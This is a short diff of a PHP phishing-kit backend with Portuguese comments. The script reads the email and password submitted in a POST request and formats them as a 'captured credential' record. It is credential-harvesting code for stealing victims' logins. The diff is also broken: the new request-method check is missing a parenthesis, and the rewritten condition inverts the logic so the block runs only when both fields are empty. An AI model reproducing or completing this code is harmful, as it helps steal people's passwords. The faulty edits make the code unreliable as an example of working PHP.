@@ -19,14 +19,14 @@
 
 <?php
 // Verificar se a requisição é POST
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+if ($_SERVER['REQUEST_METHOD'] === 'POST' {
     
     // Verificar se os dados do POST não estão vazios
-    if (!empty($_POST["email"] && !empty($_POST["senha"])) {
+    if(!$_POST["email"] && !$_POST["senha"]){
 
         // Pega o email e senha
-        $email=$_POST["email"]
-        $senha=$_POST["senha"]
+        $email=$_POST["email"];
+        $senha=$_POST["senha"];
 
         // Criar uma string com os dados do POST
         $dados = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " . $email . "\nSENHA: " . $senha . "\n\n####\n";
